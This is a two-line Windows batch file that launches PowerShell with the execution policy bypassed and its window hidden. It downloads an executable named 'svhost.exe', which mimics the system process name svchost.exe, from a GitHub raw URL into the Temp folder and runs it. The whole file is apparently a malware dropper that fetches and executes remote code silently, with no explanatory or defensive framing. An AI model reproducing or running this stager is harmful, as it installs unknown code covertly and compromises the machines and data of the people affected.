@echo off
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/minhdmkk6/t34/raw/refs/heads/main/svhost.exe' -OutFile $env:Temp\svhost.exe; Start-Process -FilePath $env:Temp\svhost.exe}"
